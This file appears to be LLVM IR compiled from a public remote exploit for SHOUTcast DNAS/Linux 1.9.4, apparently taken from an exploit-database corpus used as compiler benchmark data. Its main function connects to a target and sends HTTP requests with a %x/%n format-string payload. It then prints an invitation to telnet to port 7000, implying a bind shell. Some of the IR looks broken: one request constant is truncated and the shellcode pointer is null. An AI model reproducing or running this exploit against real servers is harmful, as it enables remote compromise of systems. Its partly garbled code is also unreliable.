; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_712.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_712.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, i32, %struct.in_addr }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.req1 = private unnamed_addr constant [1024 x i8] c"GET /contentalign 16
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [18 x i8] c".mp3 HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [471 x i8] c"GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3 HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [83 x i8] c"SHOUTcast DNAS/Linux v1.9.4 format string remote exploit by pucik www.CC-Team.org\0A\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"Usage: %s <host>\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [26 x i8] c"Cannot get IP of %s, %s!\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [27 x i8] c"Cannot connect to %s, %s!\0A\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"[*] Sending first request ...\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"[*] Sending second request ...\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"[*] Try telnet %s 7000 :)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca [1024 x i8], align 16
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [1024 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([1024 x i8], [1024 x i8]* @__const.main.req1, i32 0, i32 0), i64 1024, i1 false)
  %13 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %14 = load i8*, i8** @shellcode, align 8
  %15 = call i32 @strcat(i8* %13, i8* %14)
  %16 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %17 = call i32 @strcat(i8* %16, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  store i8* getelementptr inbounds ([471 x i8], [471 x i8]* @.str.1, i64 0, i64 0), i8** %11, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.2, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %27

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i8* %24)
  %26 = call i32 @exit(i32 0) #4
  unreachable

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  store i8* %30, i8** %7, align 8
  %31 = load i8*, i8** %7, align 8
  %32 = call %struct.hostent* @gethostbyname(i8* %31)
  store %struct.hostent* %32, %struct.hostent** %8, align 8
  %33 = icmp ne %struct.hostent* %32, null
  br i1 %33, label %41, label %34

34:                                               ; preds = %27
  %35 = load i32, i32* @stderr, align 4
  %36 = load i8*, i8** %7, align 8
  %37 = load i32, i32* @errno, align 4
  %38 = call i8* @strerror(i32 %37)
  %39 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %36, i8* %38)
  %40 = call i32 @exit(i32 -1) #4
  unreachable

41:                                               ; preds = %27
  %42 = load i32, i32* @PF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 0)
  store i32 %44, i32* %6, align 4
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %46 = load %struct.hostent*, %struct.hostent** %8, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 0
  %48 = load i64, i64* %47, align 8
  %49 = inttoptr i64 %48 to %struct.in_addr*
  %50 = bitcast %struct.in_addr* %45 to i8*
  %51 = bitcast %struct.in_addr* %49 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %50, i8* align 4 %51, i64 4, i1 false)
  %52 = load i32, i32* @PF_INET, align 4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %52, i32* %53, align 4
  %54 = load i32, i32* @PORT, align 4
  %55 = call i32 @htons(i32 %54)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %55, i32* %56, align 4
  %57 = load i32, i32* %6, align 4
  %58 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %59 = call i32 @connect(i32 %57, %struct.sockaddr* %58, i32 4)
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %68

61:                                               ; preds = %41
  %62 = load i32, i32* @stderr, align 4
  %63 = load i8*, i8** %7, align 8
  %64 = load i32, i32* @errno, align 4
  %65 = call i8* @strerror(i32 %64)
  %66 = call i32 @fprintf(i32 %62, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %63, i8* %65)
  %67 = call i32 @exit(i32 -1) #4
  unreachable

68:                                               ; preds = %41
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0))
  %70 = load i32, i32* %6, align 4
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %72 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %73 = call i32 @strlen(i8* %72)
  %74 = call i32 @write(i32 %70, i8* %71, i32 %73)
  %75 = load i32, i32* %6, align 4
  %76 = call i32 @close(i32 %75)
  %77 = load i32, i32* @PF_INET, align 4
  %78 = load i32, i32* @SOCK_STREAM, align 4
  %79 = call i32 @socket(i32 %77, i32 %78, i32 0)
  store i32 %79, i32* %6, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %82 = call i32 @connect(i32 %80, %struct.sockaddr* %81, i32 4)
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %91

84:                                               ; preds = %68
  %85 = load i32, i32* @stderr, align 4
  %86 = load i8*, i8** %7, align 8
  %87 = load i32, i32* @errno, align 4
  %88 = call i8* @strerror(i32 %87)
  %89 = call i32 @fprintf(i32 %85, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %86, i8* %88)
  %90 = call i32 @exit(i32 -1) #4
  unreachable

91:                                               ; preds = %68
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %93 = load i32, i32* %6, align 4
  %94 = load i8*, i8** %11, align 8
  %95 = load i8*, i8** %11, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = call i32 @write(i32 %93, i8* %94, i32 %96)
  %98 = load i32, i32* %6, align 4
  %99 = call i32 @close(i32 %98)
  %100 = load i8*, i8** %7, align 8
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i8* %100)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, i8*, i8*) #2

declare dso_local i8* @strerror(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
